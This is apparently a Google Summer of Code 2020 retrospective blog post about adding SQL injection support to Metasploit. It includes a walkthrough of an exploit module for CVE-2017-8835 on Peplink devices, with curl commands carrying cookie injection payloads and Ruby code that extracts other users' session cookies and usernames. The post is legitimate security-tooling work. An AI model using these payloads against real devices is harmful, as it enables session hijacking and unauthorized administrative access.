---
title: "GSoC 2020 - Enhancing metasploit support for 'the Hack That Will Never Go Away'"
date: 2019-04-24T09:27:58+02:00
author: "NIBOUCHA Redouane"
description: "an overview of the work I accomplished during Google Summer of Code 2020"
cover: "https://res.cloudinary.com/dik00g2mh/image/upload/v1598717631/gsoc_2020/lbqz6lw6yy0uytgggnov.png"
tags: ["sql injection", "web security", "opensource", "programming"]
categories: ["security"]
---
# Table of Contents
1. [Introduction](#0b79795d3efc95b9976c7c5b933afce2)
2. [My Proposal](#67ed87f44709a5e274e570dc0174bb38)
3. [Community-Bonding period](#7aef9d0c5402a915a1f7711fd90218ed)
4. [Results of my contribution](#fed02dc7f03d495d89a1783a42fa77d3)
5. [Writing an exploit for CVE-2017-8835](#981725cf5d343830f3590df23fbbf285)
	1. [Analysis of the vulnerability](#04d84c9eded9f4fdc34c7148a3a77686)
	2. [Creation of the SQL injection object](#d3af9b314b9b5c1de3c386ce802233eb)
	3. [a word about session management](#58adb7987ef3ebb0891820242143bb4d)
	4. [Plan for our implementation](#d805c5ef0dda336d58014183916db15b)
	5. [Results of the execution](#707ae1bbecb994d13ec98cb72f2316b7)
6. [Conclusion](#6f8b794f3246b0c1e1780bb4d4d5dc53)


Being interested in computer security, and being an opensource lover, I wanted to
participate in Google Summer of Code this year, after checking out the list of organizations,
I applied for Metasploit, because `Ruby` is my main programming language, and because I
was very interested in contributing to a framework of this popularity.


# <span id='67ed87f44709a5e274e570dc0174bb38'>My Proposal</span>

You can find my proposal [here](https://summerofcode.withgoogle.com/projects/#6297726754488320).

# <span id='7aef9d0c5402a915a1f7711fd90218ed'>Community-Bonding period</span>

On May 4th, I got the announcement of being accepted to take part on the program,
during the month of May, I did my best to get familiar with the codebase, I tried fixing
issues, understanding the structure of the libraries that had a similar usage to what I
was willing to develop.

Some issues I fixed in the Community-Bonding period:

- [Fix winrm_login module](https://github.com/rapid7/metasploit-framework/pull/13442)
- [Fix following redirects from send_request_cgi!](https://github.com/rapid7/metasploit-framework/pull/13448)

a module I also contributed during that period:

- [Add the LFI module for QNAP RCE (CVE 2019-7192 - CVE 2019-7195)](https://github.com/rapid7/metasploit-framework/pull/13534)

Thanks to [h00die](https://keybase.io/h00die) for helping out on this module.


# <span id='fed02dc7f03d495d89a1783a42fa77d3'>Results of my contribution</span>

After working three months on implementing the project on my proposal, here are the Pull-Requests I sent during the GSoC period:
1. Merged
- [Support for MySQL/MariaDB injection, and rewrite of some module](https://github.com/rapid7/metasploit-framework/pull/13596)
- [Specs/Unit tests for the library](https://github.com/rapid7/metasploit-framework/pull/13913)
- [Support for SQLite injection, and module for a peplink balance vulnerability (CVE-2017-8835)](https://github.com/rapid7/metasploit-framework/pull/13847)
- Also was able to discover and fix [a bug on cookie parsing](https://github.com/rapid7/metasploit-framework/pull/13900), while testing my library
2. Not merged yet:
- [Support for PostgreSQL, and module for CVE-2019-13375](https://github.com/rapid7/metasploit-framework/pull/14067)
3. PR not sent yet
- [Support for Microsoft SQL Server](https://github.com/red0xff/metasploit-framework/tree/GSOC/MSSQLi_Support)
- [Support for Oracle Database](https://github.com/red0xff/metasploit-framework/tree/GSOC/Oracle-DB-SQLi-Support)
4. To-do work
- Specs for the other implementations, should be using the shared examples, because of the similar structure between DBMS-specific classes.
- Perhaps modules exploiting Oracle Database/MSSQL injection vulnerabilities, and using the library (only testing modules have been provided).

Summary of the work done:

| DBMS                 | Regular SQLi          | Time Blind               | Boolean blind | Reading files        | Writing to files               |
|:--------------------:|:---------------------:|:------------------------:|:-------------:|:--------------------:|:------------------------------:|
| MySQL/MariaDB        | Yes                   | Yes                      | Yes           | Yes (`load_file`)    | Yes (select .. into dumpfile)  |
| SQLite               | Yes                   | Yes (heavy queries)      | Yes           | No                   | Yes (attach database ..)       |
| PostgreSQL           | Yes                   | Yes                      | Yes           | No                   | Yes (copy ... to ...)          |
| Microsoft SQL Server | Yes                   | Yes (stacked queries)    | Yes           | No                   | No                             |
| Oracle Database      | Yes, one row at a time| Yes (`dbms_pipe` package)| Yes           | No                   | No                             |

- Methods for enumerating databases, table names, column names, users also were provided for each DBMS.

# <span id='981725cf5d343830f3590df23fbbf285'>Writing an exploit for CVE-2017-8835</span>

While browsing recent SQL injection CVEs, I came across [CVE-2017-8835](https://www.cvedetails.com/cve/CVE-2017-8835/), after searching a bit,
[I found it on exploit-db](https://www.exploit-db.com/exploits/42130), seeing that the DBMS in-use is SQLite, this looked like a great candidate for testing
SQLite injection support.

Luckily, I was able to reproduce the vulnerability on [FusionHub](https://www.peplink.com/products/fusionhub/), by flashing a vulnerable firmware version,
also, because the SQL injection (as reported in the Exploit-DB link) is boolean-based blind, and they are using it just to bypass authentication, so I thought about
enumerating more.

The final version of the module can be found [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/peplink_bauth_sqli.rb), this
is a step-by-step guide as of where I was able to save time writing it.

## <span id='04d84c9eded9f4fdc34c7148a3a77686'>Analysis of the vulnerability</span>

When looking at the vulnerability, we notice that the injection happens on a SELECT statement, the injection point is like : `SELECT id from sessions where sessionid='<INJECTION POINT>';`,
and it's just bypassing authentication (an admin must be authenticated for it to work), so, I quickly got FusionHub running with the vulnerable firmware, and started testing.

Visiting `/cgi-bin/MANGA/admin.cgi` with the bauth cookie issued by the webserver:

```bash
curl --cookie "bauth=' or 1=1--" http://192.168.1.254/cgi-bin/MANGA/admin.cgi -vv
```

![sqli_true](https://res.cloudinary.com/dik00g2mh/image/upload/v1598710714/gsoc_2020/abb86y9pya2nv7xmemhh.png)

Now, visiting the same URL with an invalid cookie value (select statement should return 0 rows)

```bash
curl --cookie "bauth=' and 1=2--" http://192.168.1.254/cgi-bin/MANGA/admin.cgi -vv
```

![sqli_false](https://res.cloudinary.com/dik00g2mh/image/upload/v1598710728/gsoc_2020/ldh97tzuxweyjldyuuyd.png)

It's obvious that the taken result from the select in the first case is the session of a user who is not logged-in, and in the second case, it worked as if the session cookie wasn't set
(as you see, a `Set-Cookie` header was returned).

This additional `Set-Cookie` header should be enough to distinguish between true and false expressions, and to retrieve all the data from the database, we have a place for a condition to evaluate,

and we can see the result of its evaluation.

## <span id='d3af9b314b9b5c1de3c386ce802233eb'>Creation of the SQL injection object</span>

The code for creating the SQLi object is:

```ruby
@sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
  res = send_request_cgi({
    'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
    'method' => 'GET',
    'cookie' => "bauth=' or #{payload}--"
  })
  fail_with 'Unable to connect to target' unless res
  res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid
end
```

The code is very straightforward.

- The dbms argument is the class that should handle this injection, we know it's `SQLite` and it's boolean-based blind.
- Because it's boolean-based blind, the payload that our block will receive will always be a condition, we just have to query it.
- Our block should return a boolean, if the condition is true, the server should not yield a `Set-Cookie` header because it would return an existing session, our block should return true.
- If the condition is false, the server should yield a `Set-Cookie` header, so our block should return false.

Having the object created, it is no longer a blind SQL injection for the module writer, the method `run_sql` takes an SQL query, and takes care of converting it to a serie of conditions that will be passed to the block.
(Without the SQL Injection library, module writers would need to do the binary search involved with blind SQL injection)
First, let's check that the target is really vulnerable:

```ruby
if @sqli.test_vulnerable
  Exploit::CheckCode::Vulnerable
else
  Exploit::CheckCode::Safe
end
```
The `test_vulnerable` method just checks if yielding `1=1` to the block returns `true`, and `1=2` returns `false`.

## <span id='58adb7987ef3ebb0891820242143bb4d'>a word about session management</span>

For managing sessions, two tables are created using the following queries

```
CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, sessionid TEXT NOT NULL, tstamp TIMESTAMP NOT NULL, UNIQUE(sessionid))
CREATE TABLE IF NOT EXISTS sessionsvariables (id INTEGER REFERENCES sessions(id) ON DELETE CASCADE, name TEXT NOT NULL, value TEXT NOT NULL, PRIMARY KEY (id, name))
```

- `sessions` holds the actual cookie, in the `sessionid` field.
- for authenticated users, `sessionsvariables` contains many rows per session, one has `name=expire` and `value` being an expiration time, one having `name=username` and value being the username, and so on.

## <span id='d805c5ef0dda336d58014183916db15b'>Plan for our implementation</span>

Let's count the number of existing authenticated sessions, by counting the number of expiration times that exist in the database:

```ruby
session_count = @sqli.run_sql("select count(1) from sessionsvariables where name='expire'").to_i
```

So, the plan is:
- Retrieve the `id`s of the sessions, sorted by expiration time (newest first).
- Filter them (if the user chose to only test admin/privileged sessions).
- Start retrieving the session cookies associated with each `id`.

Let's start by retrieving the `id`s of the sessions, sorted by expiration time.

Simplified code:

```ruby
digit_range = ('0'..'9')
session_ids = session_count.times.map do |i|
  id = @sqli.run_sql("select id from sessionsvariables where name='expire' " \
  "order by cast(value as int) desc limit 1 offset #{i}", output_charset: digit_range)
  # other code here, checking if the user is an admin if only admins should be returned
  id
end
```

The `digit_range` passed to `run_sql` is used to speed-up the process, since we know `id`s are integers, there are bits we already know, we don't need to leak 8 bits from each byte, by specifying the range of characters,
the injection will only leak bits that change between bytes in that range.

I will skip filtering for admins, you will find it in the final module, it can be done by checking if there is an entry having `name=rwa` and `value=1`, which means full access.

Now, retrieving actual cookies:

```ruby
alphanumeric_range = ('0'..'z')
cookies = [ ]
session_ids.each_with_index do |id, idx|
  cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}", output_charset: alphanumeric_range)
  cookies << cookie
  if datastore['EnumUsernames']
    username = @sqli.run_sql("select value from sessionsvariables where name='username' and id=#{id}")
  end
  # more code that is irrelevant to this post
end
```

## <span id='707ae1bbecb994d13ec98cb72f2316b7'>Results of the execution</span>

![retrieval of cookies](https://res.cloudinary.com/dik00g2mh/image/upload/v1598711216/gsoc_2020/wlzmh7voeuco9hkoqt7r.png)

(The error, `Login is required ...` just indicates that `x4J...2Ps` is not an admin cookie, it's the cookie of an unprivileged user).

Not only we reproduced the vulnerability, but we were able to retrieve the actual cookies with minimal effort using the library.

a note about this module: using methods like `enum_table_names`, `enum_table_columns`, `dump_table_fields` might not work because the size of the string embedded in SQL queries is limited (the vulnerable code is written in C, 
and fixed-size buffers are used), and these methods generate long queries to deal with `NULL` values, convert (cast) types, encode and so on, for cases like this, we can always fall back to `run_sql`, which should work in most cases.

# <span id='6f8b794f3246b0c1e1780bb4d4d5dc53'>Conclusion</span>

Working with rapid7 members on the Metasploit Framework was really a great experience for me, I learned a lot of things, would like to thank my mentor, Jeffrey Martin (`Op3n4M3`), as well as other contributors who helped me out,
`h00die`, `zeroSteiner` and `dwelch-r7` to name a few.

I will keep contributing to the project, hopefully getting all of the library merged, and getting some other issues I had noticed in the codebase fixed.
